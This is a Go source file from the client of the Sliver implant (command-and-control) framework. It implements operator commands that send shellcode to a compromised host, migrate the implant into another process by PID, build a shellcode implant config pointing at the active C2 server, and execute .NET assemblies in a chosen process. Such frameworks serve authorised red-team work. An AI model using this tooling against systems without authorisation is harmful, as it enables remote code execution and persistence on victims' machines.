package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io/ioutil"
	"strconv"
	"time"

	"github.com/bishopfox/sliver/client/spin"
	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func executeShellcode(ctx *grumble.Context, rpc RPCServer) {

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
		return
	}
	shellcodePath := ctx.Args[0]
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err.Error())
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", activeSliver.Name)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.TaskReq{
		Data:     shellcodeBin,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgTask,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	}
	fmt.Printf(Info + "Executed payload on target\n")
}

func migrate(ctx *grumble.Context, rpc RPCServer) {
	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a PID to migrate to")
		return
	}

	pid, err := strconv.Atoi(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
	}
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MigrateReq{
		Pid:      uint32(pid),
		Config:   config,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgMigrate,
		Data: data,
	}, 45*time.Minute)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
	}
}

func getActiveSliverConfig() *clientpb.SliverConfig {
	activeSliver := ActiveSliver.Sliver
	c2s := []*clientpb.SliverC2{}
	c2s = append(c2s, &clientpb.SliverC2{
		URL:      activeSliver.ActiveC2,
		Priority: uint32(0),
	})
	config := &clientpb.SliverConfig{
		GOOS:   activeSliver.GetOS(),
		GOARCH: activeSliver.GetArch(),
		Debug:  true,

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.SliverConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}

func executeAssembly(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Printf(Warn + "Please provide valid arguments.\n")
		return
	}
	cmdTimeout := time.Duration(ctx.Flags.Int("timeout")) * time.Second
	assemblyBytes, err := ioutil.ReadFile(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}

	assemblyArgs := ""
	if len(ctx.Args) == 2 {
		assemblyArgs = ctx.Args[1]
	}
	process := ctx.Flags.String("process")

	ctrl := make(chan bool)
	go spin.Until("Executing assembly ...", ctrl)
	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		SliverID:   ActiveSliver.Sliver.ID,
		Timeout:    int32(ctx.Flags.Int("timeout")),
		Arguments:  assemblyArgs,
		Process:    process,
		Assembly:   assemblyBytes,
		HostingDll: []byte{},
	})

	resp := <-rpc(&sliverpb.Envelope{
		Data: data,
		Type: sliverpb.MsgExecuteAssembly,
	}, cmdTimeout)
	ctrl <- true
	<-ctrl
	execResp := &sliverpb.ExecuteAssembly{}
	proto.Unmarshal(resp.Data, execResp)
	if execResp.Error != "" {
		fmt.Printf(Warn+"%s", execResp.Error)
		return
	}
	fmt.Printf("\n"+Info+"Assembly output:\n%s", execResp.Output)
}
